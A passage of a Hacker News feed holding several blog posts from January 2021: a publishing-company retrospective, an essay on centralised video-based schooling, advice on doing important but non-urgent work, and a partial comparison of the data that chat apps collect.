survive the Tech Bubble I’m convinced we’re in.</p>
<p>Towards the end of the year, it became clear that Ritza is simply a
publishing company (or at least the very beginnings of one). We are
slowly becoming experts in the entire publishing pipeline, from sourcing
high quality writing, through editing, designing, publishing, and
distributing. While we have started out with a strong focus on technical
content, there’s no reason that that has to remain a core focus forever.
I’ve had pretty mediocre experiences with technical publishing companies
like PacktPub and I believe non-tech publishers that have existed for
decades or centuries are even more in need of a bit of modernization.</p>
<p>I previously helped my Dad publish his first book of (hilarious)
<a href="http://leanpub.com/doctor"><!-- raw HTML omitted -->memoirs as a Doctor in Africa<!-- raw HTML omitted --></a> and
during the slower period between Christmas and New Year now I spent some
time tweaking the landing page, making a sample available, and doing
some marketing. So far, all I’ve done is burn $50 on Reddit ads that led
to zero sales, but I think with some experimentation with different
distribution channels there’s more potential. Stay tuned.</p>

        </div></div>]]>
            </description>
            <link>https://sixhobbits.github.io/hugoblog/posts/2020-retrospective/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683401</guid>
            <pubDate>Fri, 08 Jan 2021 10:46:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Modern education for a level playing field]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683281">thread link</a>) | @skalberg
<br/>
January 8, 2021 | https://function29.com/posts/modern-education-for-a-level-playing-field/ | <a href="https://web.archive.org/web/*/https://function29.com/posts/modern-education-for-a-level-playing-field/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p>The COVID pandemic made me think about how arcaic the current education system is. I should say, the current <em>delivery</em> of education. The core idea for a fairer education relies in a sort of <a href="https://www.khanacademy.org/">Khan Academy</a>, but at the state level. Traditional teachers won’t be replaced by a classroom computer, but would see their role reshaped: from teachers to facilitators. For example, a 1-hour class might include a 40min video of the subject delivered by a top specialist followed by 20min of classroom activities and Q&amp;As.</p><p>The current delivery of educational subjects is in the hands of an army of teachers. The quality of teaching is highly variable, and the schools with the best ratings are usually the ones in rich neighborhoods. Good ratings on a school can alone make or break the real estate market, driving house prices and rents in the nearby radius. Public schools should provide a level playing field for everyone, but this is not the case, and never has been. Rich parents can afford higher rents while poorer families are driven in the outskirsts of a city, where lower rated schools usually are. Public housing in high-income areas have historically provided a solution for this, but the chance of being accepted in a specific public housing project are still highly randomized.</p><p>During the second wave of the COVID pandemic in the UK in January 2021, the schools were again shut down. Interestingly, the <a href="https://www.bbc.co.uk/teach">BBC started broadcasting curriculum-mapped lessons</a> on primary and secondary school subjects, for free. If we were to push this concept to its very limit, imagine what a country like the UK could be able to offer to its pupils. The best of the best delivered to anyone. A physics lesson delivered by Prof. Brian Cox, a science lesson on evolutionary byology delivered by Richard Dawkins or Sir David Attenborough, an english class delivered by Stephen Fry. This is already happening in higher education and in the workplace anyways - learning and training has been remote for ages now. But this shouldn’t be the end of the classroom as the social aspect of school is as important as the educational one. Teachers could see their role reshaped towards being educators or classroom facilitators, answering pupils questions and coordinating classroom activities.</p><p>I’ve grown up in Europe, where education is generally considered quite good. My school experience up to College has been scarred by mediocrity, with some notable horrific experiences and a couple of teachers who became like mentors to me. I’m sure a lot of people can relate to my experience. Later in life and like many like me, I self-taught myself software engineering using YouTube, Coursera and online material. I’ve had the chance to follow the best courses from the best teachers at Stanford, MIT and so on. Being a drop-out from College I was even able to complete my degree by re-enlisting 10 years later and rather than going back to the classroom, I was studying the subject on Khan Academy and textbooks. The potential of a unified, highest-quality possible education delivery for everyone is immense. The solution is not necessarily remote learning, but the tools given by remote learning.</p><p>I wonder whether in the aftermath of the pandemic and the combination of widespread use of conferencing tools, unified delivery of learning might become a serious subject of discussion to build a fairer future for our children.</p></div></article></div></div>]]>
            </description>
            <link>https://function29.com/posts/modern-education-for-a-level-playing-field/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683281</guid>
            <pubDate>Fri, 08 Jan 2021 10:22:09 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How to do important but not urgent work]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25683260">thread link</a>) | @vitabenes
<br/>
January 8, 2021 | https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work | <a href="https://web.archive.org/web/*/https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p><img src="https://www.deprocrastination.co/assets/illustrations/procrastination_work_no.png" alt="Q2 Time: how to work without a looming deadline"></p><p>You have work to do, but the deadline is in a couple of weeks or months. Or you have no deadline at all.</p><p>How do you do great work every day instead of the usual last-minute push before a deadline?<br>A vitally important question in the era of knowledge work.</p><h3>The mythical land of Q2, the important but not urgent</h3><p>This post is all about the Q2 of the Eisenhower matrix - the part that many procrastinators never get around to.</p><p><img src="https://www.deprocrastination.co/assets/illustrations/eisenhower_Q2.png" alt="Eisenhower Matrix"></p><p>It's a shame because Q2 is where all the future-focused, strategic work lies: learning new skills, investing into new endeavors, working on new branches of a business,...</p><p><strong>Q2 is the quadrant of potential.</strong></p><p>Without spending time in Q2 frequently, we tread water in life, doing only the things that we've always done, or that we're forced into at the last minute. Just enough to get by, but not to go to bed with a sense of pride.</p><p>Let's change this.</p><p>We'll start with the first obstacle to working on non-urgent important tasks—the reactive habit of&nbsp;<em>checking</em>.</p><h2>Why checking things became a default habit</h2><p>If you have Internet access, you probably developed this simple habit:</p><p><em>When I get bored, I check ___________.</em></p><p>This is a problem.</p><p>Work often isn't engaging at the beginning of a session. It can seem onerous, never-ending, and boring (before you get into the problem-solving mode).</p><p>If you always have an easy way to get distracted, you'll take it. Often.</p><p>When you&nbsp;<em>check</em>&nbsp;a site or app, you get a bit of dopamine - a feel-good neurochemical.</p><p>This dopamine hit makes it addictive to check stuff. Just the possibility of something new, random, or unexpected is exciting, even if that new thing ends up being a work email.</p><p>Checking things is the cornerstone of&nbsp;<strong>a reactive work style:</strong></p><ul><li>You never do something unless it's in reply to someone else.</li><li>You wait for others to remind you multiple times to do something.</li><li>You refresh inboxes constantly and keep them open at all times.</li><li>When you find yourself bored, you immediately check something.</li></ul><p><strong>This way of working is devoid of initiative. It's an addiction to new information disguised as being "responsive."</strong></p><p>Nothing non-urgent ever gets done.</p><p>How can we get ourselves to do it?</p><h2>2 ways to do non-urgent work</h2><p>The first way is to make Q2 feel like Q1 - to make it urgent. There's a variety of ways to do it.</p><p>The second way is to choose to work on Q2 because you can.</p><h2>1. Make Q2 feel like Q1</h2><p>When we're on a deadline, we spring into action.</p><p>The consequences of not acting become clear: we'll get fired, fail a class, or ruin a relationship...</p><p>The fear of these scenarios is visceral. It drives us to finally get things done.</p><p>While reliance on this fear is not ideal, we can use it.</p><h3>Create consequences for your actions (or lack thereof)</h3><p>If you know that without a deadline, you don't work, create deadlines.</p><p>There are many ways of doing this:</p><ul><li><strong>Tell your coworker you'll do something.</strong><br>If you tell a coworker that you'll have done something by Tuesday, they will expect you to deliver. If you don't, you'll cause them to be disappointed or angry. That's a clear consequence.</li><li><strong>Promise publicly you'll do something.</strong><br>If you promise on social media or any other public forum that you'll do something by a certain time, you're putting your reputation at risk.</li><li><strong>Schedule an event you don't want to miss.</strong><br>If it's 3PM and you schedule a fancy dinner with your partner at 6PM, it becomes clear that you have only the next 3 hours to get things done (unless you want to miss the dinner). Having more events in your schedule highlights the space available for work. If there's little time for delays, you'll probably adapt and not delay.</li><li><strong>Sign up for&nbsp;<a target="_blank" href="https://www.stickk.com/">Stickk</a>&nbsp;or&nbsp;<a target="_blank" href="https://www.beeminder.com/">Beeminder.</a></strong><br>Both of these services allow you to make a financial bet against yourself. They also help you put your goals into a concrete format. Losing your own money if you don’t do something can be a powerful motivating force.</li></ul><p>Besides these ways of creating a deadline for yourself, you can also heighten your awareness of not working when you're meant to.</p><h3>Create a crystal clear sense of "Now I focus"</h3><p>When a deadline is looming over us, we feel this visceral feeling of "now I really need to work."</p><p>Suddenly, every available hour is an hour we can use to work. Having so much to do and so little time to do it makes us use every minute.</p><p>In other words, it becomes crystal clear to us that&nbsp;<strong>now is the time to focus.</strong></p><p>We can use other tools to get to that feeling.</p><h4>Work alongside others</h4><p>Our environment shapes our behavior in a profound way. Imagine you're working next to a coworker who's focusing intensely. They can also see your screen when they occasionally glance away from their work.</p><p>Would that inspire you to focus a bit more?</p><p>The research says yes.&nbsp;<a href="http://www.jstor.org/stable/10.1086/497818?seq=1#page_scan_tab_contents">One study</a>&nbsp;found that the presence of another person improves performance by 16-32%. Interestingly, the study notes: "low productivity workers are the most sensitive to the behavior of peers."</p><p>Now, if you can't use this in your physical environment and work with your coworker, or partner, you can use a service like&nbsp;<a target="_blank" href="https://www.focusmate.com/">Focusmate.</a></p><p>It allows you to work with 50 minute sessions with others who want to focus on their work.</p><p>You can try the service for free and see if it helps you.</p><h4>Make a grand gesture</h4><p><img src="https://www.deprocrastination.co/assets/tips/hotel.png" referrerpolicy="no-referrer" alt="5 Star hotel"></p><p>A slightly more esoteric way of boosting your awareness of "now I work" is to make a grand gesture.</p><p>Cal Newport describes this strategy in Deep Work and uses the example of J K Rowling.</p><p>When Rowling was stuck writing The Goblet of Fire, she decided to check into a 5 star hotel.</p><p>A stay in a hotel like that is expensive. You can spend hundreds of dollars every day.</p><p>For Rowling, the whole purpose of staying in that hotel was to write. If she was paying thousands of pounds every week, it heightened her awareness time passing. She was paying for every minute, so she'd better produce something worth it.</p><p>Now, this grand gesture is not available to all of us, but another is:&nbsp;<strong>a trip.</strong></p><p>To help himself decide whether to start his online training program AltMBA, Seth Godin went into the desert for a few days with his friends.</p><p>He had one objective for himself: decide.</p><p>He thought about the project, wrote about it, and ultimately decided to commit and do it.</p><p>Could you take a trip somewhere as an opportunity to make a decision you’ve been putting off?</p><p>If you don't want to make yourself work using the above, the other choice is creating a routine in your life to take on non-urgent work without pressure.</p><h2>2. Choosing to work now</h2><h3>Make time for Q2 or it won't happen</h3><p>The anti-dote to reactive site and app checking is&nbsp;<strong>consciously blocking out big uninterrupted chunks of time.</strong></p><p>Our mind works best when we focus on 1 task for an extended period of time, without interruptions.</p><p>If you have email or social media open at all times, you'll get interrupted.</p><h3>Decide to set specific times aside</h3><p>When was the last time you had 2+ hours to work on non-urgent tasks? A time when you didn’t check any distractions and had no one interrupt you?</p><p>If you have to starch your memory extensively to find an answer, then it may be time for a change.</p><p>Uninterrupted time is crucial for productivity, particularly when it comes to dealing with complex or ambiguous tasks.</p><p>It’s also crucial to specify what you’re going to work on. Without a clear intention, the urgent work and unproductive habits will take over.</p><p>The simplest way to do this is to put a big block on the calendar and put what you need to do as the title. You can also add any links or notes to the description.</p><p>When in your week can you do this? When can you make time for futures oriented, important work?</p><h3>Choose to work because you can</h3><p>The last point may well be the most important one. Much of our time, we don’t choose to work. We’re forced to do so by our circumstances. That puts us in a defensive position.</p><p>But we can actively&nbsp;<em>choose</em>&nbsp;to do work. Choose to write that email. Choose to reach out to someone. Choose to start working on the next project. Go on offense.</p><p>Fear is the default motivator for many of us. If I don't do this, I will [insert unpleasant consequences here].</p><p>There are other ways, other internal narratives that we can use.</p><p>"I'm doing this because I have the time and I'm alert and able.""I'll do this because the sooner I do it, the better.""I'll get this done now because it would be awesome if it existed."</p><p>Instead of focusing on what happens if you&nbsp;<em>don't</em>&nbsp;do something, focus on what happens if you&nbsp;<em>do</em>.</p><p>Switch from the fear of consequences to desire for a specific awesome version of the future.</p><p><strong>When you do block out a 2 hour block of time and find yourself with nothing urgent to do, choose to work.</strong>&nbsp;Because you can. Because you want to create something awesome. Because it will make you happy at the end of the day, week, month, and year.</p><p>Don't wait until circumstances force you, go on offense now!</p><h2>Summary</h2><p>There are 2 main ways to get non-urgent work done:</p><ol start=""><li>Make it feel urgent.</li><li>Choose to do it.</li></ol><p>To make work feel more urgent, you can:</p><ul><li><p>Create consequences for your inaction.</p><ul><li>Tell your coworker you'll do something.</li><li>Promise publicly you'll do something.</li><li>Schedule an event you don't want to miss.</li><li>Sign up for&nbsp;<a target="_blank" href="https://www.stickk.com/">Stickk</a>&nbsp;or&nbsp;<a target="_blank" href="https://www.beeminder.com/">Beeminder.</a></li></ul></li><li><p>Make yourself hyper-aware of not taking action.</p><ul><li>Work alongside others with&nbsp;<a target="_blank" href="https://www.focusmate.com/">Focusmate.</a></li><li>Make not taking action feel wasteful to yourself (scrolling social media in a 5 star hotel).</li></ul></li></ul><p>To choose to do non-urgent work:</p><ul><li>Block out big uninterrupted chunks of time for non-urgent work.</li><li>Assign specific times to specific tasks.</li><li>When you have the opportunity, choose to work because you can.</li></ul><p>Pick 1 strategy out of this article and apply it today!</p></article></div>]]>
            </description>
            <link>https://www.deprocrastination.co/blog/how-to-do-important-but-not-urgent-work</link>
            <guid isPermaLink="false">hacker-news-small-sites-25683260</guid>
            <pubDate>Fri, 08 Jan 2021 10:16:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Signal, thank you for not collecting my data. But I won’t use you]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 9 (<a href="https://news.ycombinator.com/item?id=25682981">thread link</a>) | @rukshn
<br/>
January 8, 2021 | https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/ | <a href="https://web.archive.org/web/*/https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Facebook has given an ultimatum for WhatsApp users to either share their data with Facebook or leave the service. And that date is February 8th.</p>
<p>One of the most appealing things about WhatsApp is it’s end to end encryption. Even though their are other chat apps, no one provides end to end encryption to chats by default other than WhatsApp and Signal. </p>
<p>Not even Telegram provide encryption by default, and you need to start a secret chat to enable end to end encryption.</p>
<p>One of the most important things in iOS 14 is the ability for users see what kind of data apps are collecting from their users. </p>

<p>So in light of all this I went through the top 10 social networking/chat apps to see how much data they are collecting in comparison to Signal, and explain why I won’t use Signal and what we can do instead.</p>
<h2>The top 10 social media/chat apps</h2>

<figure><img data-attachment-id="146" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/img_1621/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=828%2C1792&amp;ssl=1" data-orig-size="828,1792" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="img_1621" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=139%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?fit=473%2C1024&amp;ssl=1" loading="lazy" width="473" height="1024" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=139%2C300&amp;ssl=1 139w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=768%2C1662&amp;ssl=1 768w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=710%2C1536&amp;ssl=1 710w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?w=828&amp;ssl=1 828w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/img_1621.png?resize=473%2C1024&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Telegram</h2>
<p>Telegram is one of the better apps when we compare with the others in this group. They collect relatively small amount of data.</p>
<p>It is currently the number 1 in my region, Telegram is extremely popular in my region because it provides a great way to share pirated content. </p>
<p>There is no limit to the file size that you can upload on Telegram, and there is no limit for the number of users that a Telegram group can have.</p>
<p>This makes it an ideal place for people to share pirated copies of movies, games, songs in groups with hundreds of users.</p>
<figure><img data-attachment-id="157" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image/" data-orig-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" data-orig-size="473,598" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image" data-image-description="" data-medium-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=237%2C300&amp;ssl=1" data-large-file="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?fit=473%2C598&amp;ssl=1" loading="lazy" width="473" height="598" src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;ssl=1" alt="" srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?w=473&amp;ssl=1 473w, https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=237%2C300&amp;ssl=1 237w" data-lazy-src="https://i2.wp.com/ruky.me/wp-content/uploads/2021/01/image.jpg?resize=473%2C598&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<p>I’m bit reluctant to use Telegram due to its poor user interface, and its connections to Russia.</p>
<p>To clarify what I meant by poor user interface, on the android device that I tried Telegram, I was unable to select multiple chats, and deleting a chat is a multi step process. It doesn’t have to be that complicated.</p>
<h2><strong>WhatsApp</strong> </h2>
<p>WhatsApp is currently the number 2 in my region, and when compared with Telegram, WhatsApp is collecting a decent amount of data to track you.</p>
<figure><img data-attachment-id="158" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-1/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" data-orig-size="473,701" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-1" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=202%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?fit=473%2C701&amp;ssl=1" loading="lazy" width="473" height="701" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=473%2C701&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=202%2C300&amp;ssl=1 202w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=202%2C300&amp;ssl=1 202w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-1.jpg?resize=473%2C701&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Facebook and <strong>Messenger</strong> </h2>
<p>Facebook is a vacuumed of user data, they collect everything that they can get their hands on.</p>
<p>The Messenger app is also no different to the Facebook app. I’m not installing either of them, no matter how much Facebook mobile website tries to funnel me to installing their Messenger app.</p>
<figure><img data-attachment-id="159" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-2/" data-orig-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=473%2C880&amp;ssl=1" data-orig-size="473,880" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-2" data-image-description="" data-medium-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=161%2C300&amp;ssl=1" data-large-file="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?fit=473%2C880&amp;ssl=1" loading="lazy" width="473" height="880" src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=473%2C880&amp;ssl=1" alt="" srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=161%2C300&amp;ssl=1 161w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?w=473&amp;ssl=1 473w, https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=161%2C300&amp;ssl=1 161w" data-lazy-src="https://i0.wp.com/ruky.me/wp-content/uploads/2021/01/image-2.jpg?resize=473%2C880&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<figure><img data-attachment-id="160" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-3/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=473%2C784&amp;ssl=1" data-orig-size="473,784" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-3" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=181%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?fit=473%2C784&amp;ssl=1" loading="lazy" width="473" height="784" src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=473%2C784&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=181%2C300&amp;ssl=1 181w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=181%2C300&amp;ssl=1 181w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-3.jpg?resize=473%2C784&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>IMO</h2>
<p>IMO is also a chat app with a niche audience. Even though it’s not popular in the USA, IMO is quite popular in Southeast Asia as a platform to share adult content, like a live cam website.</p>
<p>But it too has chat capabilities just like any other chat app, and it too collects a decent amount of user data, even more than WhatsApp.</p>
<figure><img data-attachment-id="161" data-permalink="https://ruky.me/2021/01/08/signal-thank-you-for-not-collecting-my-data-but-i-wont-use-you/image-4/" data-orig-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=473%2C842&amp;ssl=1" data-orig-size="473,842" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;1&quot;}" data-image-title="image-4" data-image-description="" data-medium-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=169%2C300&amp;ssl=1" data-large-file="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?fit=473%2C842&amp;ssl=1" loading="lazy" width="473" height="842" src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=473%2C842&amp;ssl=1" alt="" srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=169%2C300&amp;ssl=1 169w" sizes="(max-width: 473px) 100vw, 473px" data-recalc-dims="1" data-lazy-srcset="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?w=473&amp;ssl=1 473w, https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=169%2C300&amp;ssl=1 169w" data-lazy-src="https://i1.wp.com/ruky.me/wp-content/uploads/2021/01/image-4.jpg?resize=473%2C842&amp;is-pending-load=1#038;ssl=1" data-old-srcset="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7 "></figure>
<h2>Viber</h2>
<p>When it comes to my friends and relatives Viber is the second most popular chat app behind WhatsApp and Facebook Messenger.</p>
<p>Especially girls love using Viber because of the large variety of stickers, that they can select in the app.</p>
<p>Personally, I don’t like using viber, and find it too bloated. Yes, the stickers are nice, but what I need is a chat app, not a sticker app.</p>
<p>And it appears Viber is also collecting lot of data as well.</p>
